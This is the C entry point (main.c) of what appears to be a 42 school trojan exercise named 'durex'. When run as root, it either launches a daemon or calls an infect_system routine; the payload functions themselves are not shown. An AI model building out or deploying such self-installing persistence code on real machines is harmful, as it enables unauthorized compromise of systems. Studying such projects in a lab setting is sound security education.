/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/10/16 21:07:42 by frmarinh          #+#    #+#             */
/*   Updated: 2017/10/16 21:08:15 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.h"

int		main(int argc, char **argv, char **env)
{
	t_durex		*durex = get_durex(env, FRAISE);

	if (durex) {
		srand(time(NULL));
		if (getuid()) {
			return (-1);
		}
		if (is_in_binary_path(durex)) {
			init_daemon(durex);
		} else {
			infect_system(durex);
		}
		return (0);
	} else {
		return (-1);
	}
}
